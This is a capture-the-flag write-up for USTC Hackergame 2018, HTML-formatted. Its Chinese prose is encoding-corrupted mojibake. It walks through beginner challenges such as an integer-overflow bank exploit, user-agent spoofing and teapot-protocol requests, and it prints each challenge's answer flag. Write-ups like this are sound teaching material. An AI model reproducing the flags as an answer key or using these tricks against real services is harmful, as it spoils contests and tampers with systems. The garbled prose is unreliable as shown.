    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ä¸­ç§‘å¤§-Hackergame2018-write-up"><a href="#ä¸­ç§‘å¤§-Hackergame2018-write-up" class="headerlink" title="ä¸­ç§‘å¤§-Hackergame2018 write-up"></a>ä¸­ç§‘å¤§-Hackergame2018 write-up</h1><blockquote><pre><code>è¿™ä¸ªæ¯”èµ›ä¸»è¦é¢å‘æ–°ç”Ÿï¼Œè¾ƒä¸ºå‹å¥½ï¼Œé“¾æ¥ï¼šhttps://hack.lug.ustc.edu.cn/å®˜æ–¹writeup:&lt;https://github.com/ustclug/hackergame2018-writeups&gt;æ­¤åœºæ¯”èµ›å……æ»¡äº†çŒ«å’ªä¸flxgï¼ˆåºŸç†å…´å·¥ï¼‰ï¼Œè™½ç„¶ä½œä¸ºä¸€ä¸ªè€è…Šè‚‰å»åšå°é²œè‚‰çš„é¢˜å¾ˆä¸å¥½æ„æ€ï¼Œä½†è¯¥åšçš„è¿˜æ˜¯è¦åšå•¦ã€‚</code></pre></blockquote><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><blockquote><p>æ‰“å¼€<a href="http://202.38.95.46:12002/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a>ä¹‹åï¼Œé¢˜é¢å¦‚ä¸‹å›¾ï¼š</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02b2fdc456.png" alt=""></p><blockquote><pre><code>Keyçš„è¾“å…¥æ¡†é™åˆ¶äº†é•¿åº¦ï¼Œé€šè¿‡å¼€å‘è€…å·¥å…·ä¿®æ”¹é¡µé¢æºç ï¼Œæˆ–è€…æŠ“åŒ…å‘é€ hackergame2018è·å– flag:The flag is: flag{Hackergame2018_Have_Fun!}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02bfb8a96d.png" alt="">  </p><h2 id="çŒ«å’ªé—®ç­”"><a href="#çŒ«å’ªé—®ç­”" class="headerlink" title="çŒ«å’ªé—®ç­”"></a>çŒ«å’ªé—®ç­”</h2><blockquote><p>è¿™ä¸€é¢˜è™½ç„¶è¡¨é¢ä¸Šæ˜¯å¯¹ä¸­ç§‘å¤§æ–°ç”Ÿæœ‰ä¼˜åŠ¿ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯ä¸ªç¤¾å·¥é¢˜ã€‚è€ƒéªŒå­¦ç”Ÿçš„æœç´¢èƒ½åŠ›ï¼Œä¿¡æ¯æ”¶é›†èƒ½åŠ›ã€‚æ¯•ç«Ÿä¿¡å®‰è‚¯å®šæ˜¯è¦è·Ÿè¿™ä¸ªæ‰“äº¤é“çš„å•¦ã€‚ç®€å•æœç´¢ï¼ˆç™¾åº¦ï¼Œå¿…åº”ï¼Œè°·æ­Œï¼‰ä¸€ä¸‹ï¼Œæäº¤å¾—åˆ°flagï¼š</p><p>flag{G00G1E-is-always-YOUR-FRIEND} </p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02da7e38a4.png" alt=""></p><h2 id="æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡"><a href="#æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡" class="headerlink" title="æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡"></a>æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡</h2><blockquote><pre><code>è¿™ä¸€é¢˜å®é™…ä¸Šè€ƒéªŒå­¦ç”Ÿçš„æ‹¼å›¾èƒ½åŠ›ï¼Œåªä¸è¿‡æ˜¯èŠ±çš„å®æ—¶é—´é•¿çŸ­è€Œå·²ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯å­—æ¯å’Œæ•°å­—çš„åˆ†è¾¨ï¼Œå¯èƒ½æœ‰çš„å…¶ä»–é¢˜ç›®ä¼šéœ€è¦ä¸€ä¸ªå‰é¢çš„è¿‡ç¨‹æ¥è·å–åˆ°é›¶ç¢çš„å›¾ç‰‡ï¼Œå†åˆ°è¿™ä¸€æ­¥æ‹¼å›¾ã€‚æ‹¼å®Œå›¾å¯ä»¥å¾—åˆ°flagï¼šâ€‹    flag{H4PPY_1M4GE_PR0CE551NG}</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc02e508ccdd.png" alt=""></p><h2 id="çŒ«å’ªå’Œé”®ç›˜"><a href="#çŒ«å’ªå’Œé”®ç›˜" class="headerlink" title="çŒ«å’ªå’Œé”®ç›˜"></a>çŒ«å’ªå’Œé”®ç›˜</h2><blockquote><pre><code>é¢˜ç›®æ˜¯ä¸€ä»½ç»è¿‡äº†ä¹±åºå¤„ç†çš„ä»£ç ï¼Œè™½ç„¶è¯´æ˜¯ä¹±åºï¼Œä½†è¿˜æ˜¯æœ‰ä¸€å®šè§„å¾‹çš„ï¼Œæ¯”å¦‚è¯´å¯ä»¥çœ‹å‡ºè·Ÿåˆ—æœ‰å…³ç³»ï¼ŒæŸåˆ—æ•´ä½“ç§»åˆ°å¦ä¸€ä¸ªä½ç½®ä¹‹ç±»çš„ã€‚</code></pre><p>ç®€å•æ¥è¯´ï¼Œè¦è¿˜åŸæ•´ä¸ªé¡¹ç›®æ˜¯ä¸å¤ªå¯èƒ½å®ç°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ ¹æ®å‡ºé¢˜äººç»™æˆ‘ä»¬çš„è·¯ï¼Œè®¤çœŸæŠ‰æ‹©ï¼Œç„¶åè¡ŒåŠ¨ã€‚æ¯”å¦‚æºç é¦–éƒ¨çš„authorï¼Œnameï¼Œurlç­‰ä¿¡æ¯ï¼Œå¯ä»¥è°·æ­Œå¾—åˆ°é¡¹ç›®çš„ä¸€éƒ¨åˆ†æºç ï¼Œå†è¿˜åŸä¸€éƒ¨åˆ†å…³é”®æ€§çš„ä»£ç ï¼Œç†è§£é€»è¾‘å³å¯ã€‚</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc0378f2d30c.png" alt=""></p><p>  <img src="https://i.loli.net/2018/10/12/5bc0317a3d624.png" alt=""></p><blockquote><pre><code>æ ¹æ®nameï¼Œauthorå¯ä»¥åœ¨æœåˆ°ä½äºgithubçš„é¡¹ç›®æºç ï¼Œå‰ä¸€éƒ¨åˆ†è‡ªå®šä¹‰å‡½æ•°æ˜¯ç›¸åŒçš„ï¼Œä¸»å‡½æ•°ä¸åŒï¼Œæˆ‘ä»¬è¿˜åŸä¸€ä¸‹ABCï¼ŒBACï¼ŒCABï¼šABCï¼šFfQ47if9Zxw9jXE68VtGABACï¼šJDk6Y6Xc88UrUtpK3iF8pCABï¼š7BMs4y2gzdG8Ao2gv6aiJæ ¹æ®ä¸»å‡½æ•°é€»è¾‘å¯ä»¥å¾—åˆ°flagæ˜¯åƒä¸‹é¢è¿™æ ·æ‹¼æ¥çš„ï¼šprintf(&quot;%s%s%s%s %s%s%s%s%s%s%d %s%d%s&quot;ï¼Œ&quot;f&quot;,&quot;l&quot;,&quot;a&quot;,&quot;g&quot;,ABC,&quot;&quot;,BAC,&quot;&quot;,CAB,&quot;}&quot;,&quot;type_printf&quot;,&quot;_&quot;,&quot;}&quot;)flag{FfQ47if9Zxw9jXE68VtGAJDk6Y6Xc88UrUtpK3iF8p7BMs4y2gzdG8Ao2gv6aiJ125type_printf92}</code></pre></blockquote><h2 id="Word-æ–‡æ¡£"><a href="#Word-æ–‡æ¡£" class="headerlink" title="Word æ–‡æ¡£"></a>Word æ–‡æ¡£</h2><blockquote><pre><code>è¿™é¢˜çš„è¯ä¸»è¦æ˜¯ç»™æ–°ç”Ÿæ‰©å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šofficeå¥—ä»¶å®é™…ä¸Šéƒ½å±äºzipå‹ç¼©åŒ…ï¼Œå°†åç¼€æ”¹ä¸ºzipå°±èƒ½ä»¥å‹ç¼©åŒ…çš„å½¢å¼æ‰“å¼€officeæ–‡æ¡£ï¼Œç„¶åçœ‹è§å…¶æ–‡ä»¶ç»“æ„ã€‚</code></pre></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc03a0493152.png" alt=""></p><h2 id="çŒ«å’ªé“¶è¡Œ"><a href="#çŒ«å’ªé“¶è¡Œ" class="headerlink" title="çŒ«å’ªé“¶è¡Œ"></a>çŒ«å’ªé“¶è¡Œ</h2><p><img src="https://i.loli.net/2018/10/12/5bc03afaf3184.png" alt=""></p><blockquote><pre><code>åˆæ˜¯ä¸€é€šè¿‡éæ³•è·å–é’±è´¢ä¹°flagçš„é¢˜ç›®å‘¢ï¼Œç»è¿‡ç®€å•çš„å°è¯•è¾“å…¥åå‘ç°æ²¡ä»€ä¹ˆç‰¹æ®Šçš„æ¼æ´ï¼Œä¸èƒ½ä»¥ç§‘å­¦è®¡æ•°ï¼ˆå¦‚ 0e516516ï¼‰çš„æ–¹å¼ä½œä¸ºåˆ‡å…¥ç‚¹ï¼Œæ”¹cookieåªèƒ½é‡ç½®è´¦æˆ·ï¼Œä¹°1/4ä¸ªflagè·Ÿæ²¡ä¹°ä¼¼çš„ã€‚</code></pre><p>â€‹    ä»”ç»†çœ‹å¯ä»¥å‘ç°ï¼Œç†è´¢æ—¶é—´æœ‰ä¸‹é™ï¼Œä½†æ˜¯æ²¡æœ‰ä¸Šé™ï¼Œå…ˆå…‘æ¢TDSUï¼Œè¾“ä¸€ä¸ªå¤§æ•°è¯•è¯•çœ‹ï¼Œohä¸€ä¸å°å¿ƒå°±æº¢å‡ºäº†ï¼š</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc03c707e924.png" alt=""></p><blockquote><pre><code>ä½†æ˜¯æˆ‘ä»¬éœ€è¦æ§åˆ¶æº¢å‡ºçš„æ”¶ç›Šï¼Œä¸ç„¶æ”¶ç›Šä¸ºè´Ÿï¼Œå¤Ÿä½ å—çš„äº†ã€‚é€šè¿‡æ§åˆ¶è¾“å…¥çš„å¤§æ•°çš„å¤§å°æ¥è°ƒèŠ‚ï¼š922337203685477500</code></pre></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc03da7f11cd.png" alt=""></p><blockquote><p>The flag is: <code>flag{Evil_Integer._Evil_Overflow.}</code> </p><p>æŠ¤ç½‘æ¯ä¸­é‚£ä¸ªè¾£æ¡ä¹‹ç‹æº¢å‡ºçš„é¢˜æ¯”è¾ƒç²¾å¦™ï¼Œéœ€è¦é€šè¿‡æ¡ä»¶ç«äº‰çš„æ‰‹æ³•ï¼ˆå³å¤šçº¿ç¨‹åŒæ—¶è´­ä¹°ï¼ŒåŒä¸€æ—¶é—´å¤šæ¬¡è´­ä¹°åªéœ€è¦ä¸€æ¬¡ä»˜é’±ï¼‰ï¼Œå†åˆ¤æ–­æº¢å‡ºç‚¹ï¼Œä»è€Œgetflagï¼šé¢˜è§£ <a href="https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/?tdsourcetag=s_pcqq_aiomsg</a></p></blockquote><h2 id="é»‘æ›œçŸ³æµè§ˆå™¨"><a href="#é»‘æ›œçŸ³æµè§ˆå™¨" class="headerlink" title="é»‘æ›œçŸ³æµè§ˆå™¨"></a>é»‘æ›œçŸ³æµè§ˆå™¨</h2><blockquote><p>è¿™å°±æ˜¯é‚£ä¸ªå‘åˆ°æ— æ•°è€å°‘çˆ·ä»¬ï¼Œä¸€æ—¶é£å¤´æ— ä¿©çš„é»‘æ›œçŸ³æµè§ˆå™¨(HeiCore)ï¼Œç¡®å®å‡ºé¢˜äººæ¯”è¾ƒè‰¯å¿ƒï¼Œä¸ºè¿™ä¸ªé¢˜ç›®ç”šè‡³ä¸“é—¨å†™äº†ä¸€ä¸ªå‰ç«¯é¡µé¢æ¥è¿·æƒ‘å„ä½CTFerï¼Œè¿™ä¸ªé»‘æ›œçŸ³æµè§ˆå™¨ä¸»é¡µæ˜¯åœ¨ç™¾åº¦ä¸Šä¸èƒ½æœç´¢åˆ°çš„ï¼Œåœ¨å¿…åº”å’Œè°·æ­Œä¸Šå¯ä»¥æŸ¥åˆ°ï¼Œå¾ˆæ˜æ˜¾è¿™ä¸ªé¡µé¢å¾ˆä¸æ­£ç»ï¼Œç®€ç›´æ˜¯åœ¨å˜²ç¬‘å„ä½CTFerçš„æ™ºå•†å˜›æ˜¯ä¸æ˜¯ï¼Ÿ</p><p>å¥½å›åˆ°é¢˜ç›®ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä¹Ÿåšäº†æ¯”è¾ƒä¹…ï¼Œå°è¯•è¿‡å„ç§æ–¹æ³•ä¹‹åå›åˆ°äº†åŸç‚¹ï¼šé»‘æ›œçŸ³æµè§ˆå™¨ä¸»é¡µï¼Œè¿™ä¸ªä¸»é¡µé™¤äº†å‡æ­£ç»ä¹‹å¤–è¿˜æœ‰å°±æ˜¯ï¼Œä¸èƒ½æŸ¥çœ‹æºç ï¼Œç”¨è°·æ­Œçš„å¼€å‘è€…å·¥å…·çœ‹ä¸»é¡µæ—¶ä¼šè¿”å›404ã€‚é‚£ä¹ˆé—®é¢˜å·²ç»æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œè¿™é‡Œå°±æ˜¯å‡ºé¢˜äººçš„é˜»ç¢ï¼Œä¸ºå•¥è¦é˜»ç¢ï¼Œå› ä¸ºå…³é”®åœ¨è¿™é‡Œï¼Œæ‹¿åˆ°å…³é”®çš„ä¸œè¥¿ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å»é¢˜ç›®é‚£é‡Œè·å–flagäº†ã€‚</p><p>è°·æ­Œç”¨ä¸äº†æˆ‘ä»¬ç”¨ç«ç‹å˜›ï¼Œæ¥çœ‹çœ‹networkï¼Œçœ‹çœ‹æºç ï¼š</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc0424f6bfaf.png" alt=""></p><blockquote><pre><code>å“¦åš¯ï¼Œè·å¾—äº†ä¸€ä¸ªuser-agentï¼Œé¢˜ç›®é¡µé¢ä¸æ˜¯éœ€è¦é€šè¿‡é»‘æ›œçŸ³æµè§ˆå™¨è®¿é—®å—ï¼Œæ—¢ç„¶æˆ‘ä»¬æ²¡æœ‰é»‘æ›œçŸ³æµè§ˆå™¨è¿™ä¸ªä¸œè¥¿ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡user-agentæ¥ä»£è¡¨æˆ‘ä»¬æ˜¯é»‘æ›œçŸ³æµè§ˆå™¨çš„èº«ä»½å’¯ï¼Œæ„é€ è¯·æ±‚ï¼ŒåŠ ä¸Šuser-agnetï¼Œgetflagã€‚</code></pre><p>The flag is: <code>flag{H3ic0re_49.1.2623.213_sai_kou}</code> </p></blockquote><h2 id="å›åˆ°è¿‡å»"><a href="#å›åˆ°è¿‡å»" class="headerlink" title="å›åˆ°è¿‡å»"></a>å›åˆ°è¿‡å»</h2><pre class=" language-shell"><code class="language-shell">#input_sequenceqedaflag{.a44a2b8a3d9b2c               #å…³é”®åœ¨è¿™ä¸€è¡Œæœ€åçš„cæ˜¯ä¿ç•™ä¸ä¿ç•™c44039f93345}.2m3                    #å¼€å§‹æ¢è¡Œ2m52m12                    #åˆ‡æ¢åˆ°ç¬¬äºŒè¡Œs/4/t                #å°†å½“å‰è¡Œçš„ç¬¬ä¸€ä¸ª4æ›¿æ¢ä¸ºtqq</code></pre><blockquote><pre><code>è¿™ä¸€é¢˜ä»‹ç»äº†ä¸€ä¸‹edç¼–è¾‘å™¨çš„ä½¿ç”¨ï¼Œç»™å‡ºäº†ä¸€ä¸ªæ–‡ä»¶å¦‚ä¸Šï¼Œé‡Œé¢æœ‰é”®ç›˜è®°å½•ï¼Œå®é™…ä¸Šæ ¹æ®é”®ç›˜è®°å½•ï¼Œåˆ©ç”¨edç¼–è¾‘å™¨é‡å†™ä¸€éå°±å¯è·å¾—flagï¼Œä½†æ˜¯è¿™ä¸ªè¿˜æ˜¯æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œé‚£å°±æ˜¯é‚£ä¸ªå¤šå‡ºæ¥çš„ ESCç‰¹æ®Šç¬¦ï¼Œåˆšå¼€å§‹åœ¨MobaXtermä¸Šé¢è‡ªå¸¦çš„edåšé¢˜ï¼Œå‘ç° 2m3ä¹‹ç±»çš„æ¢è¡Œå‘½ä»¤æ— æ³•å®ç°ï¼Œåæ¥ä½¿ç”¨äº‘æœåŠ¡å™¨è¿›è¡Œä¸€æ³¢æ“ä½œå¾—åˆ°flagï¼š</code></pre><p>flag{t4a2b8c44039f93345a3d9b2}</p></blockquote><h2 id="æˆ‘æ˜¯è°"><a href="#æˆ‘æ˜¯è°" class="headerlink" title="æˆ‘æ˜¯è°"></a>æˆ‘æ˜¯è°</h2><blockquote><pre><code>è¿™ä¸€é¢˜æœ‰ä¸¤ä¸ªå°é¢˜ï¼Œå……æ»¡å“²å­¦ã€‚è€ƒå¯Ÿçš„æ˜¯å®¢æˆ·ç«¯é”™è¯¯ç›¸åº”ä»£ç å’Œ â€œé€’èŒ¶â€åè®®ã€‚ã€‚ã€‚</code></pre><p>ç¬¬ä¸€é¢˜é€šè¿‡æŸ¥çœ‹networkï¼Œå¯ä»¥çœ‹åˆ°status codeé‡Œé¢æœ‰ <code>418 I AM A TEAPOT</code>ï¼Œæ­£å¥½é—®æˆ‘æ˜¯è°å˜›ï¼ŒæŠŠTEAPOTå¡«è¿›å»ï¼Œgetflag1:<br>flag{i_canN0t_BReW_c0ffEE!} </p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc0460ef19b2.png" alt=""></p><p><img src="https://i.loli.net/2018/10/12/5bc0464a1b3a2.png" alt=""></p><blockquote><pre><code>ç„¶åå¯ä»¥è·å–ç¬¬äºŒå°é¢˜çš„é“¾æ¥ï¼Œç®€å•æŸ¥çœ‹ä¸€ä¸‹ï¼Œå“åº”å¦‚ä¸‹ï¼š</code></pre></blockquote><pre class=" language-shell"><code class="language-shell">#è¿™å¹´å¤´ç»™å¤§ä½¬é€’èŒ¶éƒ½ä¸ç®€å•äº†Brewing tea is not so easy.Try using other methods to request this page.#è¯•è¯•postè¯·æ±‚ï¼Œå“åº”å¦‚ä¸‹ï¼šThe method "POST" is deprecated.See RFC-7168 for more information.#è¯•è¯•brewè¯·æ±‚ï¼Œå“åº”å¦‚ä¸‹ï¼šPlease check if there is anything missing in your header.</code></pre><blockquote><p>ç»“åˆä¸¤é¢˜çš„ä¿¡æ¯ I AM A TEAPOT  + brew tea + RFC-7168æœç´¢ä¸€ä¸‹ï¼Œå¯ä»¥å¾—åˆ°è¯´æ˜æ–‡æ¡£ï¼š</p><pre><code>https://tools.ietf.org/html/rfc7168</code></pre><p>æ ¹æ®æ–‡æ¡£æ„é€ è¯·æ±‚headeré‡Œé¢çš„Content-Type: message/teapotï¼Œå‘é€è¿‡å»å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯:</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc04932d86c3.png" alt=""></p><blockquote><p>æ ¹æ®è¿”å›çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦å°†æ„é€ çš„è¯·æ±‚å‘é€åˆ°å¦ä¸€ä¸ªurl,å³åœ¨åŸurlåé¢åŠ ä¸Šé€’èŒ¶ç±»å‹black_tea:</p><p>/the_super_great_hidden_url_for_brewing_tea/black_tea</p><p>getflag:</p><p><img src="https://i.loli.net/2018/10/12/5bc049bab0ba3.png" alt=""></p></blockquote><h2 id="å®¶é‡Œæœ‰çŸ¿"><a href="#å®¶é‡Œæœ‰çŸ¿" class="headerlink" title="å®¶é‡Œæœ‰çŸ¿"></a>å®¶é‡Œæœ‰çŸ¿</h2><blockquote><p>æç¤ºï¼š</p><ol><li>æœ¬é¢˜çš„æµè§ˆå™¨â€œæŒ–çŸ¿â€åªä¸ºæ¼”ç¤ºæ€§ç›®çš„ï¼Œå‡ ä¹ä¸å èµ„æºã€‚æˆ‘ä»¬ä¸ä¼šä»¥ä»»ä½•å½¢å¼ç›—å–æˆ–æµªè´¹å¤§å®¶ç”µè„‘çš„ç®—åŠ›ã€‚</li><li>æœ¬é¢˜å¦‚æœä½¿ç”¨ç¨‹åºæ±‚è§£ï¼Œå¯¹äºæ™®é€šé…ç½®çš„ä¸ªäººç”µè„‘ï¼Œåœ¨è§£æ³•æ­£ç¡®ä¸”æœ€ä¼˜çš„æƒ…å†µä¸‹ï¼Œæ±‚è§£ç¨‹åºçš„æœŸæœ›è¿è¡Œæ—¶é—´ä¸ä¼šè¶…è¿‡å‡ åˆ†é’Ÿã€‚</li></ol><p>è¯¥é¢˜å¹¶ä¸æ˜¯å¸¸è§„çš„web é¢˜ï¼Œè§£é¢˜è¿‡ç¨‹ä¸æ¶‰åŠæ³¨å…¥ã€XSSã€æ•æ„Ÿæ–‡ä»¶æ³„éœ²ã€å¼±ç±»å‹ç­‰å®‰å…¨é—®é¢˜ã€‚ </p><p>ä½†æ˜¯æˆ‘æš‚æ—¶ä¸ä¼šï¼Œæ‰€ä»¥å¾…æ›´æ–°ã€‚</p></blockquote><h2 id="ç§˜ç±æ®‹ç¯‡"><a href="#ç§˜ç±æ®‹ç¯‡" class="headerlink" title="ç§˜ç±æ®‹ç¯‡"></a>ç§˜ç±æ®‹ç¯‡</h2><blockquote><pre><code>ä»è¿™é¢˜å°±å¼€å§‹æ¶‰åŠå¤æ–‡åŒ–ï¼Œç„å­¦çŸ¥è¯†äº†ã€‚è¿™é¢˜ä¹Ÿæ˜¯ä¸€ä¸ªä¸¤å°é¢˜çš„é¢˜ç›®ï¼Œç¬¬ä¸€é¢˜ç»™å‡ºäº†ä¸€æ®µmalbolgeè¯­è¨€çš„ä»£ç åœ¨æ–‡ä»¶ä¸­ã€‚ä¸€ä¸ªéªšæ“ä½œã€‚ã€‚ç›´æ¥ç”¨ç«ç‹æµè§ˆå™¨æ‰“å¼€æ–‡ä»¶ï¼Œç„¶åè°ƒæ•´é¡µé¢å¤§å°(%30)ï¼Œå®½åº¦å¾—åˆ°ä»¥ä¸‹å˜²è®½CTFerçš„å›¾æ¡ˆ:</code></pre><p><img src="https://i.loli.net/2018/10/12/5bc052d4be6b1.png" alt=""><br>   â€‹<br>flxg{University_Ridiculous}<br>   â€‹<br>ç¬¬äºŒé¢˜å¾…æ›´æ–°ã€‚</p></blockquote><h2 id="çŒ«å’ªé¥æ§å™¨"><a href="#çŒ«å’ªé¥æ§å™¨" class="headerlink" title="çŒ«å’ªé¥æ§å™¨"></a>çŒ«å’ªé¥æ§å™¨</h2><blockquote><p>ä¸ºäº†æŠ¥å¤çŒ«å’ªæŠŠè‡ªå·±çš„ä»£ç æ‰“ä¹±ï¼ˆè§ï¼šçŒ«å’ªä¸é”®ç›˜ï¼‰ï¼ŒD åŒå­¦æŠŠçŒ«å’ªé¥æ§å™¨ç»‘åœ¨å¯ä»¥ä¸Šï¼ˆUPï¼‰ä¸‹ï¼ˆDOWNï¼‰å·¦ï¼ˆLEFTï¼‰å³ï¼ˆRIGHTï¼‰ç§»åŠ¨çš„ä¸‰è½´æœºæ¢°è‡‚ä¸Šï¼Œå¼€å§‹ä½¿ç”¨æ ‘è“æ´¾ï¼ˆä¸€æ¬¾åŸºäº Linux çš„å•ç‰‡æœºè®¡ç®—æœºï¼‰æ§åˆ¶ä¸‰è½´æœºæ¢°è‡‚ï¼Œè¿›è€Œæ§åˆ¶çŒ«å’ªåœ¨è‰åœ°ä¸Šè·‘æ¥è·‘å»ã€‚ </p><p>æ­¤é¢˜ç»™å‡ºçš„txtæ–‡ä»¶ä¸­æœ‰ U(UP),D(DOWN),L(LEFT),R(RIGHT)ï¼Œå³ä¸Šä¸‹å·¦å³å’¯ï¼Œæ—¢ç„¶æ˜¯è®©çŒ«å’ªæŒ‰è¿™ä¸ªè·‘ï¼Œå¾ˆç®€å•å°±æ˜¯ç”»å‡ºè·¯çº¿å›¾å˜›ï¼Œå†™ä¸€ä¸ªç®€å•çš„pythonè„šæœ¬ï¼Œåˆ©ç”¨tutleæµ·é¾Ÿåº“å†™ï¼Œgetflagï¼š</p><p>flag{MeowMeow}</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> turtle <span class="token keyword">as</span> T<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'seq.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>T<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">'U'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">270</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><blockquote><p>è¿è¡Œç»“æœ:</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc0561d47cad.png" alt=""></p><h2 id="å¥¹çš„è¯—"><a href="#å¥¹çš„è¯—" class="headerlink" title="å¥¹çš„è¯—"></a>å¥¹çš„è¯—</h2><blockquote><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªpoem.zipï¼ŒåŒ…å«ä¸€ä¸ªpythonè§£å¯†è„šæœ¬å’Œä¸€ä¸ªåŒ…å«åŠ å¯†åè¯—çš„æ–‡ä»¶ã€‚æ ¹æ®è§£å¯†è„šæœ¬å¯ä»¥çŸ¥é“æ˜¯uuencodeï¼Œå¼€å§‹è¿‡äºç›¸ä¿¡è¿™ä¸ªè§£å¯†è„šæœ¬ï¼Œæ²¡æƒ³åˆ°å‡ºé¢˜äººåœ¨è¿™å„¿åŠ¨æ‰‹è„š</p><pre class=" language-python"><code class="language-python">   <span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>   <span class="token comment" spellcheck="true"># This script helps you decode "her poem"</span>   <span class="token keyword">from</span> codecs <span class="token keyword">import</span> decode   fin <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>   fout <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.out"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> fin<span class="token punctuation">:</span>      data <span class="token operator">=</span> <span class="token string">"begin 666 &lt;data>\n"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" \nend\n"</span>      decode_data <span class="token operator">=</span> decode<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uu"</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decode_data<span class="token punctuation">)</span>      fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decode_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>   fin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   fout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>   <strong>é‡ç‚¹ï¼åœ¨çº¿è§£å¯†å¯†æ–‡å³å¯å¾—åˆ°çœŸæ­£çš„flag</strong>ï¼Œflagåˆ†æ•£è—åœ¨æ¯è¡Œçš„å¤´éƒ¨ï¼Œä½†æ˜¯flagå°‘äº†ä¸€ä¸ªnéœ€è¦è‡ªè¡Œæ·»åŠ åœ¨æœ€åé¢è¡¥å…¨ä¸ºä¸€ä¸ªå•è¯funã€‚</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc057e2cd0ed.png" alt=""></p><h2 id="çŒ«å’ªå…‹æ˜Ÿ"><a href="#çŒ«å’ªå…‹æ˜Ÿ" 